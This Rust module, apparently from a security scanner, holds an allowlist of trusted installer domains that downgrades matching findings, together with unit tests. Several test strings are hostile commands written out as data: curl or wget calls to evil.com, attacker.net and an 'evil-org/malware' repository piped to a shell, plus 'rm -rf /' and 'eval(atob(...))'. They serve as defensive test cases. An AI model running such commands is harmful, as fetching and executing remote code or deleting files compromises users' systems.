//! Trusted installer domain allowlist.
//!
//! Findings that match URLs from trusted installer domains (e.g. ollama.com,
//! brew.sh, rustup.rs) are downgraded to Info severity. Data is externalized
//! to `data/trusted-domains.json` and `data/trusted-domains-community.json`,
//! embedded at compile time via `include_str!()`.

use regex::Regex;
use serde::Deserialize;
use std::sync::LazyLock;

const OFFICIAL_JSON: &str = include_str!("../data/trusted-domains.json");
const COMMUNITY_JSON: &str = include_str!("../data/trusted-domains-community.json");

/// URL extraction regex: captures domain and optional path.
static URL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"https?://([a-zA-Z0-9._-]+)(/[^\s|"')\]>]*)?"#).expect("URL regex")
});

/// JSON file wrapper.
#[derive(Debug, Deserialize)]
struct TrustedDomainFile {
    domains: Vec<TrustedDomain>,
}

/// A trusted installer domain entry.
#[derive(Debug, Clone, Deserialize)]
struct TrustedDomain {
    domain: String,
    #[serde(default)]
    path_prefix: Option<String>,
    purpose: String,
}

/// Database of trusted installer domains.
pub struct TrustedDomainDb {
    domains: Vec<TrustedDomain>,
}

impl TrustedDomainDb {
    /// Load the built-in trusted domain databases (official + community).
    pub fn load_builtin() -> Self {
        let official: TrustedDomainFile =
            serde_json::from_str(OFFICIAL_JSON).expect("Failed to parse trusted-domains.json");
        let community: TrustedDomainFile = serde_json::from_str(COMMUNITY_JSON)
            .expect("Failed to parse trusted-domains-community.json");

        let mut domains = official.domains;
        domains.extend(community.domains);

        Self { domains }
    }

    /// Check if a code snippet contains a URL to a trusted installer domain.
    /// Returns the matched domain (with purpose) if found.
    pub fn check_snippet(&self, snippet: &str) -> Option<String> {
        for cap in URL_RE.captures_iter(snippet) {
            let host = cap.get(1).map(|m| m.as_str()).unwrap_or("");
            let path = cap.get(2).map(|m| m.as_str()).unwrap_or("");

            for td in &self.domains {
                if host == td.domain {
                    match &td.path_prefix {
                        Some(prefix) => {
                            if path.starts_with(prefix.as_str()) {
                                return Some(format!("{} ({})", td.domain, td.purpose));
                            }
                        }
                        None => {
                            return Some(format!("{} ({})", td.domain, td.purpose));
                        }
                    }
                }
            }
        }
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_load_builtin() {
        let db = TrustedDomainDb::load_builtin();
        assert!(db.domains.len() >= 12);
    }

    #[test]
    fn test_match_simple_domain() {
        let db = TrustedDomainDb::load_builtin();
        assert!(db
            .check_snippet("curl -fsSL https://ollama.com/install.sh | sh")
            .is_some());
        assert!(db
            .check_snippet("curl -sSf https://sh.rustup.rs | sh")
            .is_some());
        assert!(db
            .check_snippet("curl -fsSL https://brew.sh/install.sh | bash")
            .is_some());
    }

    #[test]
    fn test_no_match_unknown_domain() {
        let db = TrustedDomainDb::load_builtin();
        assert!(db
            .check_snippet("curl https://evil.com/malware.sh | sh")
            .is_none());
        assert!(db
            .check_snippet("wget https://attacker.net/payload | bash")
            .is_none());
    }

    #[test]
    fn test_path_prefix_matching() {
        let db = TrustedDomainDb::load_builtin();
        // NVM installer on raw.githubusercontent.com — trusted
        assert!(db
            .check_snippet(
                "curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash"
            )
            .is_some());
        // Homebrew on raw.githubusercontent.com — trusted
        assert!(db
            .check_snippet(
                "curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh | bash"
            )
            .is_some());
        // Random repo on raw.githubusercontent.com — NOT trusted
        assert!(db
            .check_snippet(
                "curl https://raw.githubusercontent.com/evil-org/malware/main/install.sh | sh"
            )
            .is_none());
    }

    #[test]
    fn test_no_url_in_snippet() {
        let db = TrustedDomainDb::load_builtin();
        assert!(db.check_snippet("rm -rf /").is_none());
        assert!(db.check_snippet("eval(atob('abc'))").is_none());
    }

    #[test]
    fn test_returns_domain_with_purpose() {
        let db = TrustedDomainDb::load_builtin();
        let result = db
            .check_snippet("curl https://get.docker.com | sh")
            .unwrap();
        assert!(result.contains("get.docker.com"));
        assert!(result.contains("Docker"));
    }
}
